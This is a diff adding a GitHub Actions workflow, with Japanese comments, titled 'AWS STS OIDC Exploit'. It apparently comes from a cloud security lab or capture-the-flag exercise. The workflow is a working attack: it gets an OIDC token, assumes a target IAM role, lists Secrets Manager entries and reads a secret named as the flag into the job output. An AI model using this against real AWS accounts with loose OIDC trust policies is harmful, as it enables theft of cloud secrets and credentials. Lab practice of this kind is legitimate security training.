@@ -1,0 +1,42 @@
+name: AWS STS OIDC Exploit
+
+# 手動トリガーおよびPush時に実行
+on:
+  workflow_dispatch:
+  push:
+
+# OIDCトークンを取得するための必須権限
+permissions:
+  id-token: write
+  contents: read
+
+jobs:
+  exfiltrate-secret:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout Code
+        uses: actions/checkout@v4
+
+      - name: Assume Target IAM Role via OIDC
+        uses: aws-actions/configure-aws-credentials@v4
+        with:
+          role-to-assume: arn:aws:iam::814236473104:role/sts-lab-2-target
+          aws-region: us-east-1 # ラブ環境のリージョンに合わせて変更（通常はus-east-1）
+
+      - name: Enumeration - Get Caller Identity
+        run: aws sts get-caller-identity
+
+      - name: Enumeration - List Secrets Manager
+        run: |
+          aws secretsmanager list-secrets \
+            --query 'SecretList[*].Name' \
+            --output text
+
+      - name: Exploitation - Read the Flag
+        # 下記の 'TARGET_SECRET_NAME' は、上記Listコマンドの出力結果に置き換えて再実行します
+        # または、パイプラインで自動的に取得して読み込む処理を記述します
+        run: |
+          aws secretsmanager get-secret-value \
+            --secret-id TARGET_SECRET_NAME \
+            --query 'SecretString' \
+            --output text
